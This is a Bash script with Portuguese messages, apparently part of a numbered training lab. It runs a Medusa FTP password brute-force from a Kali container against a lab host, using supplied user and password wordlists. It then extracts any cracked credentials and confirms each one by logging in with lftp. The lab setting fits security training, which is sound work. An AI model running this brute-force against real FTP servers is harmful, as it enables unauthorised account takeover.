#!/usr/bin/env bash
set -euo pipefail

SCRIPT_NAME="$(basename "$0" .sh)"
ROOT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
LOG_DIR="$ROOT_DIR/logs"
mkdir -p "$LOG_DIR"
LOG_FILE="$LOG_DIR/${SCRIPT_NAME}-$(date +%Y%m%d-%H%M%S).log"
if [[ -e "$LOG_FILE" ]]; then
  LOG_FILE="${LOG_FILE%.log}-$$.log"
fi

START_TS=$(date +%s)

log() {
  printf '%s\n' "$*" | tee -a "$LOG_FILE"
}

run() {
  "$@" 2>&1 | tee -a "$LOG_FILE"
}

finish() {
  local end_ts elapsed
  end_ts=$(date +%s)
  elapsed=$((end_ts - START_TS))
  log "$(printf 'Tempo total: %02d:%02d:%02d' \
    $((elapsed / 3600)) \
    $(((elapsed % 3600) / 60)) \
    $((elapsed % 60)))"
}
trap finish EXIT

usage() {
  cat >&2 <<'EOF'
Uso: 10-ftp-attack.sh --users <arquivo> --passwords <arquivo> [opcoes]

Opcoes:
  --host <ip>        Host FTP (padrao: 172.28.0.10)
  --threads <N>      Threads do Medusa (padrao: 4)
  --output <path>    Log do Medusa dentro do Kali (padrao: /logs/medusa-ftp-<timestamp>.log)
EOF
}

USERS=""
PASSWORDS=""
HOST="172.28.0.10"
THREADS=4
OUTPUT="/logs/medusa-ftp-$(date +%Y%m%d-%H%M%S).log"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --users)
      USERS="${2:-}"
      shift 2
      ;;
    --passwords)
      PASSWORDS="${2:-}"
      shift 2
      ;;
    --host)
      HOST="${2:-}"
      shift 2
      ;;
    --threads)
      THREADS="${2:-}"
      shift 2
      ;;
    --output)
      OUTPUT="${2:-}"
      shift 2
      ;;
    -h|--help)
      usage
      exit 0
      ;;
    *)
      log "ERRO: opcao desconhecida: $1"
      usage
      exit 1
      ;;
  esac
done

if [[ -z "$USERS" || -z "$PASSWORDS" ]]; then
  log "ERRO: --users e --passwords sao obrigatorios"
  usage
  exit 1
fi

if [[ ! -f "$USERS" ]]; then
  log "ERRO: arquivo de usuarios nao encontrado: $USERS"
  exit 1
fi

if [[ ! -f "$PASSWORDS" ]]; then
  log "ERRO: arquivo de senhas nao encontrado: $PASSWORDS"
  exit 1
fi

if [[ "$(docker inspect -f '{{.State.Running}}' lab-kali 2>/dev/null || true)" != "true" ]]; then
  log "ERRO: lab-kali nao esta em execucao; rode 09-kali-setup.sh primeiro"
  exit 1
fi

to_container_path() {
  local p=$1
  if [[ "$p" == "$ROOT_DIR/wordlists/"* ]]; then
    printf '/wordlists/%s' "${p#"$ROOT_DIR/wordlists/"}"
  elif [[ "$p" == wordlists/* ]]; then
    printf '/wordlists/%s' "${p#wordlists/}"
  elif [[ "$p" == /wordlists/* ]]; then
    printf '%s' "$p"
  else
    log "ERRO: o arquivo deve estar em wordlists/: $p"
    exit 1
  fi
}

USERS_C="$(to_container_path "$USERS")"
PASSWORDS_C="$(to_container_path "$PASSWORDS")"

MEDUSA_ARGS=(
  medusa
  -h "$HOST"
  -U "$USERS_C"
  -P "$PASSWORDS_C"
  -M ftp
  -t "$THREADS"
  -g 10
  -v 4
  -O "$OUTPUT"
)

if (( $(wc -l < "$USERS") == 1 )); then
  MEDUSA_ARGS+=(-f)
  log "Um unico usuario: usando -f para parar no primeiro sucesso"
fi

log "== Ataque FTP com Medusa =="
log "Host: $HOST"
log "Usuarios: $USERS_C ($(wc -l < "$USERS") linhas)"
log "Senhas: $PASSWORDS_C ($(wc -l < "$PASSWORDS") linhas)"
log "Threads: $THREADS"
log "Log do Medusa: $OUTPUT"

if ! run docker exec lab-kali "${MEDUSA_ARGS[@]}"; then
  log "AVISO: Medusa retornou codigo nao zero"
fi

HOST_OUTPUT="$ROOT_DIR/logs/$(basename "$OUTPUT")"
if [[ ! -f "$HOST_OUTPUT" ]]; then
  log "ERRO: log do Medusa nao encontrado em $HOST_OUTPUT"
  exit 1
fi

FOUND="$(grep -E 'ACCOUNT FOUND' "$HOST_OUTPUT" || true)"
if [[ -z "$FOUND" ]]; then
  log "ERRO: nenhuma credencial encontrada"
  exit 1
fi

log "Credenciais encontradas:"
printf '%s\n' "$FOUND" | tee -a "$LOG_FILE"

log "Validando credenciais com lftp..."
FAIL=0
while IFS= read -r line; do
  user="$(printf '%s\n' "$line" | sed -n 's/.*User: \([^ ]*\).*/\1/p')"
  pass="$(printf '%s\n' "$line" | sed -n 's/.*Password: \([^ ]*\).*/\1/p')"
  [[ -z "$user" || -z "$pass" ]] && continue

  if docker exec lab-kali lftp -u "$user,$pass" "ftp://$HOST" -e 'ls; bye' >/dev/null 2>&1; then
    log "OK: validado $user"
  else
    log "ERRO: falha ao validar $user"
    FAIL=1
  fi
done <<< "$FOUND"

if ((FAIL)); then
  log "ERRO: uma ou mais credenciais nao foram validadas"
  exit 1
fi

log "== Ataque FTP concluido =="
